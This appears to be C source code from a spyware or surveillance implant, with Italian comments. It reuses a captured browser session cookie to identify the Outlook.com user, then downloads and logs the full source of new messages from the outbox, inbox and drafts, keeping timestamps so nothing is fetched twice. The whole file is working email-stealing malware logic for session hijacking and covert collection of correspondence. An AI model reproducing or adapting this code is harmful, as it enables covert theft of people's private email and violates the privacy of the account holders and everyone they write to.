#include <windows.h>
#include <stdio.h>
#include <time.h>
#include "..\common.h"
#include "..\LOG.h"
#include "SocialMain.h"
#include "NetworkHandler.h"

extern DWORD GetLastFBTstamp(char *user, DWORD *hi_part);
extern void SetLastFBTstamp(char *user, DWORD tstamp_lo, DWORD tstamp_hi);
extern WCHAR *UTF8_2_UTF16(char *str); // in firefox.cpp
extern BOOL DumpContact(HANDLE hfile, DWORD program, WCHAR *name, WCHAR *email, WCHAR *company, WCHAR *addr_home, WCHAR *addr_office, WCHAR *phone_off, WCHAR *phone_mob, WCHAR *phone_hom, WCHAR *skype_name, WCHAR *facebook_page, DWORD flags);

extern BOOL bPM_MailCapStarted; // variabili per vedere se gli agenti interessati sono attivi
extern BOOL bPM_ContactsStarted; 
extern DWORD max_social_mail_len;

#define FREE_PARSING(x) if (!x) { SAFE_FREE(r_buffer); return SOCIAL_REQUEST_BAD_COOKIE; }

#define OUTLOOK_INBOX  "00000000-0000-0000-0000-000000000001"
#define OUTLOOK_OUTBOX "00000000-0000-0000-0000-000000000003"
#define OUTLOOK_DRAFTS "00000000-0000-0000-0000-000000000004"

BOOL ParseDate(char *str_date, FILETIME *ft)
{
	SYSTEMTIME st;
	ZeroMemory(&st, sizeof(st));
	sscanf(str_date, "%d-%d-%dT%d:%d:%d.", &st.wYear, &st.wMonth, &st.wDay, &st.wHour, &st.wMinute, &st.wSecond);
	return SystemTimeToFileTime(&st, ft);
}

DWORD ParseFolder(char *cookie, char *folder, char *user, DWORD last_tstamp_hi, DWORD last_tstamp_lo, BOOL is_incoming, BOOL is_draft)
{
	DWORD ret_val;
	BYTE *r_buffer = NULL;
	BYTE *r_buffer_inner = NULL;
	DWORD response_len;
	WCHAR url[1024];
	BYTE *parser1, *parser2;
	char message_id[256];
	char str_date[21];
	FILETIME ft;

	CheckProcessStatus();
	
	_snwprintf_s(url, sizeof(url)/sizeof(WCHAR), _TRUNCATE, L"/mail/InboxLight.aspx?n=1&fid=%S&so=Date&sa=false&fav=false", folder);		

	// Prende la lista dei messaggi
	ret_val = HttpSocialRequest(L"snt132.mail.live.com", L"GET", url, 443, NULL, 0, &r_buffer, &response_len, cookie);	
	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;

	ret_val = SOCIAL_REQUEST_BAD_COOKIE;
	parser1 = r_buffer;
	for (;;) {
		CheckProcessStatus();

		// Prende l'id del messaggio
		parser1 = (BYTE *)strstr((char *)parser1, "class=\"ia_hc t_s_hov ml");
		if (!parser1) 
			break;
		parser1 = (BYTE *)strstr((char *)parser1, "\" id=\"");
		if (!parser1) 
			break;
		parser1 += strlen("\" id=\"");
		parser2 = (BYTE *)strchr((char *)parser1, '\"');
		if (!parser2) 
			break;
		*parser2=0;
		_snprintf_s(message_id, sizeof(message_id), _TRUNCATE, "%s", parser1);
		parser1 = parser2 + 1;

		// Prende il timestamp
		parser2 = (BYTE *)strstr((char *)parser1, " mdt=\"");
		if (!parser2) 
			break;
		parser2 += strlen(" mdt=\"");
		ZeroMemory(str_date, sizeof(str_date));
		strncpy(str_date, (char *)parser2, 20);
		if (!ParseDate(str_date, &ft))
			break;

		// Verifica se e' gia' stato preso
		if (ft.dwHighDateTime < last_tstamp_hi)
			continue;
		if (ft.dwHighDateTime==last_tstamp_hi && ft.dwLowDateTime<=last_tstamp_lo)
			continue;
		SetLastFBTstamp(user, ft.dwLowDateTime, ft.dwHighDateTime);

		// Vede se si tratta di un messaggio singolo o di una conversazione
		if (!strncmp((char *)parser1, "conv=", 5) || !strncmp((char *)parser1, " conv=", 6))
			_snwprintf_s(url, sizeof(url)/sizeof(WCHAR), _TRUNCATE, L"/mail/GetMessageSource.aspx?convid=%S&folderid=%S", message_id, folder);		
		else
			_snwprintf_s(url, sizeof(url)/sizeof(WCHAR), _TRUNCATE, L"/mail/GetMessageSource.aspx?msgid=%S&folderid=%S", message_id, folder);		
		ret_val = HttpSocialRequest(L"snt132.mail.live.com", L"GET", url, 443, NULL, 0, &r_buffer_inner, &response_len, cookie);	
		if (ret_val != SOCIAL_REQUEST_SUCCESS) 
			break;
		
		CheckProcessStatus();
		// Check sulla dimensione stabilita' nell'agente
		if (response_len > max_social_mail_len)
			response_len = max_social_mail_len;
		// Verifica che non mi abbia risposto con la pagina di login
		if (r_buffer_inner && response_len>0 && strstr((char *)r_buffer_inner, "Received: "))
			LogSocialMailMessageFull(MAIL_OUTLOOK, r_buffer_inner, response_len, is_incoming, is_draft);
		else {
			SAFE_FREE(r_buffer_inner);
			break;
		}

		SAFE_FREE(r_buffer_inner);
	}
	SAFE_FREE(r_buffer);
	return ret_val;
}

DWORD HandleOutlookMail(char *cookie)
{
	DWORD ret_val;
	BYTE *r_buffer = NULL;
	DWORD response_len;
	char curr_user[256];
	char *ptr, *ptr2;
	DWORD last_tstamp_hi, last_tstamp_lo;

	CheckProcessStatus();

	if (!bPM_MailCapStarted/* && !bPM_ContactsStarted*/)
		return SOCIAL_REQUEST_NETWORK_PROBLEM;

	// Verifica il cookie 
	ret_val = HttpSocialRequest(L"snt132.mail.live.com", L"GET", L"/default.aspx", 443, NULL, 0, &r_buffer, &response_len, cookie);	
	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;

	// Identifica l'utente
	ptr = strstr((char *)r_buffer, "</script><title>");
	FREE_PARSING(ptr);
	ptr = strstr((char *)ptr, "Outlook - ");
	FREE_PARSING(ptr);
	ptr += strlen("Outlook - ");
	ptr2 = strstr((char *)ptr, "</title>");
	FREE_PARSING(ptr2);
	*ptr2 = NULL;
	_snprintf_s(curr_user, sizeof(curr_user), _TRUNCATE, "%s", ptr);	
	SAFE_FREE(r_buffer);

	last_tstamp_lo = GetLastFBTstamp(curr_user, &last_tstamp_hi);
	ParseFolder(cookie, OUTLOOK_OUTBOX, curr_user, last_tstamp_hi, last_tstamp_lo, FALSE, FALSE);
	ParseFolder(cookie, OUTLOOK_INBOX, curr_user, last_tstamp_hi, last_tstamp_lo, TRUE, FALSE);
	return ParseFolder(cookie, OUTLOOK_DRAFTS, curr_user, last_tstamp_hi, last_tstamp_lo, FALSE, TRUE);
}
